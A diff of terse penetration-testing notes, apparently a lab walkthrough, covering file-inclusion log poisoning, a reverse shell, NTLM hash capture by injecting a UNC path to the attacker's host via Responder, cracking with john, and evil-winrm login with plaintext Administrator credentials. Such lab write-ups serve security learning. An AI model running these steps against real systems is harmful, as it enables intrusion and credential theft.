@@ -21,7 +21,7 @@
 8. Now that we have confirmed LFI vulnerablity, lets log poision ../../../../var/log/apache2/access.log via invalid connection request.
 9. Connect to nc -nv $IP port. and insert commandline exeuction payload (This depends on what techonology it is using. php ..etc)
 10. check for sucessful log poisioning ../../../../var/log/apache2/access.log&cmd=i.
-11. If you receive command execution, we will insert a reversshell via url encoding. Done.
+11. If you receive command execution, we will insert a reversshell via url encoding. Done. (wrapped and url encode)
 12. Use responder to capture. sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url. Use john the ripper to match hash. 
 13. john -w=/usr/share/wordlists/rockyou.txt hash.txt
 14. login to window .evil-winrm -i 10.129.147.34 -u Administrator -p badminton
